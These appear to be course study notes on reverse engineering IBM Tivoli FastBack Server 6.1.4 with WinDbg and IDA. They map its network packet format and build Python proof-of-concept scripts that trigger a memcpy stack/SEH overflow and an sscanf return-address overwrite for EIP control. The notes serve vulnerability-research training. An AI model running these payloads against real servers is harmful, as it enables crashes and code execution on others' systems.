An exploit can't exist without first discovering a vulnerability.  
  
Reverse engineering: installing the target app and enumerating ways to feed input, reversing the code or binary segments that parse input (examining file formats and network protocols), and finding logical vulnerabilities or memory corruptions in these segments.  
  
Fuzzing: Feeding the target application large amounts of malformed input to eventually generate an access violation.  
  
Often we can start the research process with reverse engineering and move to fuzzing once we find potential vulnerabilities.  
  
This module looks specifically at the Tivoli FastBack software and how to reverse engineer using static-dynamic analysis.  
  
# Installation and Enumeration  
Version 6.1.4 of FastBack has a wide array of vulnerabilities, so we use this for testing our methodology.  
### Installation  
Use the lab VM, run: `C:\Installers\FastBackServer-6.1.4\X86_TryAndBuy\setup.exe` -> Backup Server -> Ignore (Data Deduplication Service) -> Install Anyway -> Reboot  
  
### Enumerating and Application  
Binary applications : look for unsanitized memory operations and logic bugs  
Windows service : search for insecure service permissions vulnerabilities  
Drivers : kernel space vulnerabilities  
  
Find programs running on the system listening for remote connections to a network port using TCPView (SysInternals)  
1. `C:\Tools\SysinternalsSuite\Tcpview.exe -accepteula`  
2. Options -> Uncheck "Resolve Addresses"  
3. Take note of listening/open processes, their ports and privilege level  
- FastBackMount: TCP 30051, UDP 30005  
- FastBackServer: TCP 1320, 11406, 11460, UDP 11461  
  
> In this example we start with TCP 11460 on FastBackServer  
  
# Interacting with Tivoli Storage Manager  
  
### Hooking the recv API  
Halt the program at the point in which the socket API is called to receive the incoming network packet.

1. Put WinDbg on the FastBackServer.exe process, run a breakpoint on incoming connections
	- `bp wsock32!recv`  
  
Simple python script to send input to the socket on TCP 11460:  
```  
import socket  
import sys  
  
buf = bytearray([0x41]*100)  
  
def main():  
        if len(sys.argv) != 2:  
            print("Usage: %s <ip_address>\n" % (sys.argv[0]))  
                sys.exit(1)  
  
        server = sys.argv[1]  
        port = 11460  
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.connect((server,port))  
  
        s.send(buf)  
        s.close()  
  
        print("[+] Packet sent")  
        sys.exit(0)  
```  
  
or just use `nc` for simple inputs.  
  
recv prototype:  
```  
int recv(  
  SOCKET s,  
  char   *buf,  
  int    len,  
  int    flags  
);  
```  
  
2. `dds L5 esp` after hitting the breakpoint, we see the socket descriptor, then the char* address  
3. the char* address space is populated once we finish the function, `pt`, then `da` that address to see the string  
4.  eax will contain the byte length of the received string  
  
### Synchronizing WinDbg and IDA Pro  
Transfer Tivoli FastBackServer.exe to kali box, see [[notepad.exe transfer]]  
When IDA prompts for location of imported DLLs, skip past this as they aren't needed for this analysis.  
  
1. Step through the return of recv in WinDbg, `t` once (continuing from previous section).  
2. Step to the next jump at `FX_AGENT_Receive+0x210` and note the function name  
3. In Ida, use Jump->Jump to search for `FX_AGENT_Receive`, and go to this function entry point (this is the function that recv was called from)  
4. In Ida, use `G` to jump to the address of the recv function call from WinDbg  
  
Addresses are now synced between the two programs  
  
### Tracing the Input  
We examine how the application is parsing and using the input.  
  
1. `mov [ebp+var_8], eax` -> `cmp [ebp+var_8], 0FFFFFFFFh` -> `jnz ...` : Checks to ensure the return value from `_recv@16` isn't an error. These assembly instructions roughly translate to an if statement in equivalent C.  
> the `[br=1]` is showing the result of the jump before it executes  
2. The next check is to see if the return value is greater than 0, since any non-error return values will be the length of the received string in bytes  
Resulting in c code similar to:  
```  
char* buf[0x4400];  
DWORD result = recv(s,buf,0x4400,0)  
if(result != SOCKET_ERROR)  
{  
  if(result != 0)  
  {  
    // Do something  
  }  
}  
```  
  
### Checksum (Inspecting Relevant Code)  
Before diving into code block rabbit holes, we need to determine if code block is relevant to our execution path.  
  
Finding Relevant Code Paths:  
Continuing from the previous section, we see a call to `_PERFMON_S_UpdateCounter`  
1. `ba r1 INPUT_BUFFER_ADDR` Place a hardware breakpoint on the buffer we're tracing and step over the call with `p`. If its hit, we know that path is relevant and we should resend the payload and step into it.  
2. Stepping over `_PERFMON_S_UpdateCounter` we don't trigger the breakpoint, meaning that it doesn't use the buffer at all.  
3. Back in `FX_AGENT_Receive+0x210` (the function which invokes `recv`) notice that the `mov eax, 1` instruction a few instructions down. eax is likely the return value of this function which is about to return.  
4. Follow this return and see it drops us back in `FX_AGENT_CopyReceiveBuff`, also find this in IDA. The first check afterwards looks for value zero in the return value (which currently returns our length of 0x64)  
5. To avoid exploring every path manually, fall back on the previous hardware breakpoint set on the input buffer by continuing execution with `g`  
6. It triggers at a static link memcopy: `FastBackServer!memcpy+0x130` which we cant trace back with the callstack `k` to `FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4`, a location within the last function we were inspecting  
7. Since this is the return address of the call (pointing to the instruction after the call) and the call instruction is 5 bytes long, we can disassemble the call instruction with `u FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4 -5 L1` to get the call address  
8. We need to set a breakpoint here and rerun the dynamic analysis so we can inspect what the code is doing with the buffer  
  
memcopy prototype:  
`void *memcpy(void *str1, const void *str2, size_t n)``  
  
Inspecting Relevant Code Paths:  
1. Set a breakpoint at `FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4 - 5` (from previous section)  
2. Once hit, dump the stack arguments being pushed with `dd esp L3`  
- This shows `04f54458 04f50058 00000004`, two buffer locations, and a length of 4. But we know our string is much larger...  
3. Take note of the offset used in the destination buffer address, 4438h, from `lea eax, [edx+ecx+4438h]`, we'll look for this after this memcpy  
4. Skip over the memcpy call since we know already know what that's going to do  
5. The next time 4438h is used is in a function to swap endianess, this is often done by programs to parse input as entered (big endian) vs the little endian format its stored in. This then overwrites the +4438h that it was read from.  
6. The next blocks of code perform various value checks on the buffer value. We want to stay in this right side execution stream because it contains another memcpy which might be vulnerable and ultimately ends with a push of 1 to eax and returns successfully.  
1. Our string of 'A's fails the `jbe` of 100000h check, so we need to reformat the first DWORD of our string (in the python script) and try again.  
`from struct import pack`  
`buf = pack('>i', 0x1234) #to pack in big endian`  
2. Confirm it works by placing a breakpoint at the check instruction and verifying the jump instruction (and/or manually ensure the data being compared matches the check)  
3. Continue this process for any other failing checks.  
  
Conditional Path Analysis:  
1. Continue with dynamic analysis until we reach the `cmp` where the 0x1234 is being compared to 0x64 (decimal 100), which is the length of the rest of the buffer (after the first DWORD).    
- The app can handle fragmented TCP packets, this function includes a check for fragmentation. dwHeaderLength of value 4 is added to our header, then the value 4 from edx+0x20 is subtracted right after, leaving the 0x1234 effectively unchanged for the comparison in this case.    
- This signifies that the first DWORD is intended to match the input buffer size and act as a basic checksum for verifying the data.    
2. Update the python script with the first DWORD as 0x64 and breakpoint at this compare, `bc *` and `bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6`  `  
3. Hitting the breakpoint and stepping, the code then passes the check, and in the following code block the DWORD is added, subbed, then moved to stack. It is then used as a size parameter for a memcpy, with the assumption being that the rest of the input buffer will be what is copied.    
4. We can `dd esp L3` and `dd SRC*_ADDR` to verify the parameters being pushed    
5. Stepping over the memcpy (note that the destination buffer is on the stack), the function then moves 1 into eax for a successful return.  
   
# Reverse Engineering the Protocol    
So far we identified the code that processes input to the server and found an initial checksum verification. Now, we continue onto the actual application functionality that will store and parse the malformed input, which is likely to reveal a vulnerability.  
  
### Header-Data Separation  
  
Up (from Receive) and Down (to ReceiveCommand) the Callstack:  
1. Follow the return from CopyReceiveBuff and see that it brings us to `FX_AGENT_GetData+0xd`  
2. Follow the flow with static-dynamic analysis.    
- We then find a call to `FX_AGENT_CheckPacketIsComplete` which can be assumed to check if we have fully received the packet containing input. The previous section revealed that this is hardcoded to 0x440 bytes, so anything less than this (our packet) will pass.    
3. After this, `FX_AGENT_GetData` completes execution and bring us back to `FX_AGENT_Cyclic` (recall the call stack check `k` in WinDbg from earlier when we were in the recv call), presumably to begin parsing the input data.    
4. Again, follow the folow with static-dynamic analysis.    
- We hit a call to `FXCLI_C_ReceiveCommand` which suggests our input is being used to form a command in the program.    
5. `dd esp L4` to see the arguments being pushed. There is value 1, our checksum of 0x64, a pointer to our 100 A's string, and a pointer set some bytes before that, presumably to the start of the packet received with metadata.    
  
-  In IDA we see a bunch of conditional blocks with offshoots to else conditions that all flow into error messages and lead to the same terminating block. We can imagine this as a series of nested if conditions in C.    
```    
if (condition1) {    
	if (condition2) {    
		if (condition3) {    
			...    
		}    
	}    
}    
```

> From that, we can deduce that the execution stream of interest is going to be at the end this conditional chain.    
  
The checks in this segment are:    
- check checksum not equal to 0x30    
- check checksum value (full packet size) is less than 0x186A0    
  
`psCommandBuffer`:  
1. Progress until a call to `MEM_S_GetChunk` which is a wrapper for memory allocation. Its return value is saved on the stack as a Dst "destination" buffer argument.    
2. Looking at the failure branch, we can double click the error statement and see that this newly allocated buffer is called `psCommandBuffer`.    
3. Following that successful allocation (non-zero return value) there is a call to memset (with size 0x186a4 to wipe memory at the allocation to 0) and memcpy.    
4. Perform dynamic analysis in WinDbg to just before the memcpy call.    
5. `dd esp L3` at memcpy shows the src buffer argument is starting at 0x30 from our input string and that size is 0x34 (being our checksum, 0x64, minus 0x30)    
- Since the memcpy only takes the data starting at 0x30, this indicates some difference of use between addresses 0x04 - 0x34 and 0x34 - end. We also already now that dword address 0x00 is used as the checksum length value.    
  
`psAgentCommand`:  
1. Looking at the next block's failure branch for `MEM_S_GetChunk`, we see that this buffer is call `psAgentCommand`    
2. If the allocation succeeds we see another memcpy of length 0x30 for this buffer, `psAgentCommand`.    
- We deduced that the first memcpy was for a buffer called `psCommandBuffer` which begins at offset 0x34 from out input buffer, and that the second memcpy was for buffer `psAgentCommand` at offset 0x04.  
- 
From analyzing `FXCLI_C_ReceiveCommand` we deduce our buffer is structured in this way:    
```    
0x00 - 0x04: Checksum DWORD    
0x04 - 0x34: psAgentCommand    
0x34 - End:  psCommandBuffer  
```

3. The next function of interest after these copies is `FXCLI_OraBR_Exec_Command`, because it will likely use these buffers.    
  
### Reversing the Header  
  
Opening `FXCLI_OraBR_Exec_Command` in IDA gives a warning for being too big to open, change the Max Graph Size in Options -> General -> Graph -> Max number of nodes, to 10,000.  
  
psAgentCommand Buffers Size Check:  
1. Update the python script to send different (and valid) input to each currently known section of the buffer:  
```  
buf = pack('>i',0x64)  
buf += bytearray([0x41]*30)  
buf += bytearray([0x42]*36) #arbitrary value of 0x42s  
```  
2. `bc *` and `bp FastBackServer!FXCLI_OraBR_Exec_Command` then run the script  
3. Step through instructions until `cmp dword ptr [eax+4],61A8h`. We see it is comparing to `41414141` which is a section of the `psAgentCommand` buffer.  
4. `dd eax-20 L10` shows that the data being compared is 0x14 (20) bytes into the start of the psAgentCommand, probably signifying that this intended to be another distinct region of this buffer.  
5. The preceding instruction help reveal that `var_C370` (added to the ebp) is psAgentCommand and `var_61B4` is psAgentCommand + 0x10. We can name as such in IDA for easier reversing.  
6. The following error branch (if this dword is not below value 0x61A8) says "buffer size mismatch, possible buffer overrun attack"... :o From this we can tell that this dword of the psAgentCommand is used to specify some buffer size.  
7. To pass this and continue reversing, we can do an `ed eax+4 1000` to edit the memory directly then step through the check  
  
  
Stepping into the next block we see a similar check `cmp dword ptr [ecx+0xCh], 61A8h` just at at a new offset into the psAgentCommand buffer. Then another check `cmp dword ptr [ecx+0x4], 61A8h` which is identical to the first...  
> Why would we need to check this again?? Remember this!  
  
psAgentCommand Buffers memcpy:  
1. Catching up with dynamic analysis (and passing a compare against 0) we see the memcpy block  
2. Step to the Src argument's add instruction to understand what it is copying from.  
3. `dd eax` reveals that eax points to the start of the psCommandBuffer (and we can rename `var_61B0` to psCommandBuffer in IDA). `dd edx` reveals `41414141 00001000` is added to the psCommandBuffer value, signifying some offset into this buffer that is used to start the memcpy.  
```  
0x00 - 0x04: Checksum DWORD  
0x04 - 0x30: psAgentCommand  
  - 0x04 - 0x10:  ??  
  - 0x10 - 0x14:         Offset for copy operation  
  - 0x14 - 0x18:         Size of copy operation  
  - 0x1C - 0x30:  ??  
0x34 - End:  psCommandBuffer  
```  
5. Reading ahead another 2 memcpy operations, gives us more info to the psAgentCommand structure  
```  
0x00       : Checksum DWORD  
0x04 - 0x30: psAgentCommand  
  - 0x04 - 0x10:  ??  
  - 0x14:         Offset for 1st copy operation  
  - 0x18:         Size of 1st copy operation  
  - 0x1C:         Offset for 2nd copy operation  
  - 0x20:         Size of 2nd copy operation  
  - 0x24:         Offset for 3rd copy operation  
  - 0x28:         Size of 3rd copy operation  
  - 0x2C - 0x30:  ??  
0x34 - End:  psCommandBuffer  
```  
  
Trying to step through the memcpy we get an access violation because we have input 0x41414141 to the offset field, giving memcpy an invalid Src buffer address.  
This alone can be useful for a DoS but doesn't give useful control over the application.  
  
### Exploiting Memcpy  
  
Update Python script to imitate psAgentCommand's expected structure and pass the checks (and not cause an access violation):  
```  
import socket  
import sys  
from struct import pack  
  
# Checksum  
buf = pack(">i", 0x630)  
# psAgentCommand  
buf += bytearray([0x41]*0x10)  
buf += pack("<i", 0x0)    # 1st memcpy: offset  
buf += pack("<i", 0x100)  # 1st memcpy: size field  
buf += pack("<i", 0x100)  # 2nd memcpy: offset  
buf += pack("<i", 0x200)  # 2nd memcpy: size field  
buf += pack("<i", 0x300)  # 3rd memcpy: offset  
buf += pack("<i", 0x300)  # 3rd memcpy: size field  
buf += bytearray([0x41]*0x8)  
  
# psCommandBuffer  
buf += bytearray([0x42]*0x100) # 1st buffer  
buf += bytearray([0x43]*0x200) # 2nd buffer  
buf += bytearray([0x44]*0x300) # 3rd buffer  
...  
```  
  
Because we control both the size parameter and source data that goes into these memcpy operations, we have good conditions for a memory corruption vulnerability.  
  
Checking Buffer Overflow Conditions:  
1. Set a breakpoint on the first memcpy `bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b` and send the new input  
2. `dd esp L3` show the pushed args, and `dd SRC_ADDR` (second arg) to confirm were pointing to the first section in psCommandBuffer filled with 42's  
- The theory of memcpy stack corruption is that a source buffer of unexpected size is copied into a destination buffer on the stack, eventually overflowing into a return address saved on stack. For this to work, the destination buffer needs to be stored at an address above the highest return address (so that the next return instruction will read our overflowed value). If it is stored below it, then we can't overflow into it to redirect program flow.  
3. `!teb` to ensure that the pushed buffer address is within the stack.  
4. `k` to retrieve the callstack and determine where our next return value is located. The return to ` FastBackServer!FXCLI_C_ReceiveCommand+0x130` is located at `0d51fe98` (may vary from run to run), where the preceding line ChildEBP is the stack location -0x04 of the return address from the following line's function call  
5. `dds 0d51fe98 L2` to show the return address stack location on the 2nd line  
6. `? RETURN_ADDR - DESTINATION_BUFFER` to find the difference between these two locations, in this case 0x0000c36c  
- This means we need to copy at least 0xc36c bytes to get overwrite a return address and get EIP control. However, the previous checks on the size segments only allow values of 0x61a8 or less before being passed to memcpy...  
  
BUT WAIT!  
  
Programming Conditional Error:  
- Remember how the check for the 3rd buffer size reused the address from the 1st buffer's size check? This seems like an error... The memcpy for for the 3rd buffer still uses the expected value of `ecx+14h` (2nd used `ecx+0Ch` and 1st uses `ecx+04h`) but this value was never actually checked!  
1. Step through until the memcpy for the 3rd buffer.  
2. Do the preceding steps to  check for buffer overflow conditions here.  
3. `? 0d51fe9c - 0d50d980` in this case yields a difference of 0x0001251c, which is MASSIVE.  
- This is a problem because a previous check on maximum packet size was 0x4400 bytes. We could potentially fragment the packet, OR we can misuse the offset by inputing a negative value so it will copy this memory from preceding stack space (so long as it is memory allocated to the process).  
  
### Getting EIP Control  
  
Because this buffer is so large and we are overwriting a lot of stack space on top of where the return address is located, we are likely to cause some other memory error before our manipulated byte is read by the return instruction.  
As a result, we can intentionally cause an access violation and send and even large buffer to take advantage of an SEH oveflow.  
  
Python script edits for SEH Overflow:  
```  
import socket  
import sys  
from struct import pack  
  
# Checksum  
buf = pack(">i", 0x2330)  
# psAgentCommand  
buf += bytearray([0x41]*0x10)  
buf += pack("<i", 0x0)     # 1st memcpy: offset  
buf += pack("<i", 0x1000)  # 1st memcpy: size field  
buf += pack("<i", 0x0)     # 2nd memcpy: offset  
buf += pack("<i", 0x1000)  # 2nd memcpy: size field  
buf += pack("<i", -0x11000)  # 3rd memcpy: offset  
buf += pack("<i", 0x13000) # 3rd memcpy: size field  
buf += bytearray([0x41]*0x8)  
  
# psCommandBuffer  
buf += bytearray([0x45]*0x100) # 1st buffer  
buf += bytearray([0x45]*0x200) # 2nd buffer  
buf += bytearray([0x45]*0x2000) # 3rd buffer  
...  
```  
- There is only 0x2300 bytes of data written into psCommandBuffer  
- The first 2 memcpys write the first 0x1000 bytes of psCommandBuffer to stack twice over, causing no issues.  
- The third memcpy writes the preceding -0x11000 bytes and the first 0x2000 of psCommandBuffer to stack, causing the overflow.  
  
Trying the PoC:  
1. `bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7` to break at the 3rd memcpy and run the script  
2. `dd esp L3` -> `dd 06f01c0c` -> `dd 06f01c0c + 11000` shows that a bunch of null bytes were copies (expected) follow 0x11000 bytes later by our bytearray of 45's  
3. `!exchain` to view the current intact exception chain, then step once  
4. After the access violation, `!exchain` again to see that it links to invalid exception at 45454545 meaning that we overflowed the execution chain.  
5. See the SEH Overflow block to see how to take an exploit from here.  
  
  
# Digging Deeper for More Bugs  
The previous vulnerability is likely exploitable, but we'll continue into `FastBackServer!FXCLI_OraBR_Exec_Command` and look for more memory corruption vulnerabilities.

### Switching Execution
Using proper input to follow deeper into the code, we can discover new execution paths that may lead to a vulnerability. Here we locate a comparison which switches execution path based on a value from out input.

1. Revert the Python code to no longer trigger an unsanitized memcpy

2. Restart service and set a breakpoint before the first memcpy after the input is received
	1. `bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`
3. Analyze code surrounding memcpy calls, looking for other (controllable) execution paths
4. Notice a series of direct compares and branches based on psAgentCommand
	- These comparison resemble a series of 'if' statements in C. They also all compare against the same DWORD in psAgentCommand and compare it to static values, signifying that this DWORD specifies an input mode or something similar. 
	1. `cmp dword ptr [edx+0Ch], 1090h` ...
5. Explore these execution paths to identify potential vulnerabilities
	- The next section will do this for the 0x534 execution path

Input buffer structure:
```
0x00       : Checksum DWORD
0x04 -> 0x30: psAgentCommand
  - 0x04 -> 0xC:  Not used
  - 0x10:         Opcode
  - 0x14:         Offset for 1st copy operation
  - 0x18:         Size of 1st copy operation
  - 0x1C:         Offset for 2nd copy operation
  - 0x20:         Size of 2nd copy operation
  - 0x24:         Offset for 3rd copy operation
  - 0x28:         Size of 3rd copy operation
  - 0x2C -> 0x30: Not used
0x34 -> End:  psCommandBuffer
  - 0x34 + offset1 -> 0x34 + offset1 + size1: 1st buffer
  - 0x34 + offset2 -> 0x34 + offset2 + size2: 2nd buffer
  - 0x34 + offset3 -> 0x34 + offset3 + size3: 3rd buffer
```

### 0x534 Execution Path Vulnerability
We can control the execution path of the program by changed a single DWORD of the input buffer. Here we explore and prove that the 0x534 opcode execution path has an exploitable vulnerability.

Memory Corruption - The instructions of a memory operation are abused to corrupt existing memory. memcpy, memmov, strcpy, sscanf
Logic Vulnerability - A features functionality exposes a security risk. Command injection, exe uploads, etc.

1. Update python script to specify path 0x534 and send unique input for each field / buffer

2. Restart service and set breakpoint at first opcode comparison
	1. `FXCLI_OraBR_Exec_Command+0x6ac`
	
3. Follow our opcode value comparison to the branch table jump
	- Branch table: https://en.wikipedia.org/wiki/Branch_table
	
4. Inspect the following `FXCLI_SetConfFileChunk` function call paramters
	- This reveals 3 buffers in our control: psAgentCommand, 1st psCommandBuffer, and the 3rd psCommandBuffer

5. Step into and inspect `FXCLI_SetConfFileChunk` functionality
	1. We see a call to `sscanf` using psCommandBuffer as the source

6. Search for memory corruption vulnerability in sscanf usage
	- https://cplusplus.com/reference/cstdio/sscanf/
	- sscanf's format string calls for a string `"File: %s ..."` which writes to the buffer in the 3rd argument position and reads from our first psCommandBuffer section
	1. `dd esp L7` : to check 3rd pushed argument, the destination buffer
	2. `!teb` : to check stack limits, ensuring the destination buffer is on the stack
	3. `k`, Ex:`? 0dafe318 - 0dafe204` : check callstack to nearest return address, this cannot be more than 0x43CC bytes away (0x4400 packet size - psAgentCommand = psCommandBuffer input size)
	- The return address turns out to only be 0x114 byes away
	
7. Edit python script to send a psCommandBuffer that corrupts the nearest return address
	- This uses the python format string operator % to specify a string of 0x200 A's to the string "File:" field of the input string
	2. `k` : Analyze the callstack to ensure that the return address was overwritten
	
8. Use EIP control to create a custom exploit.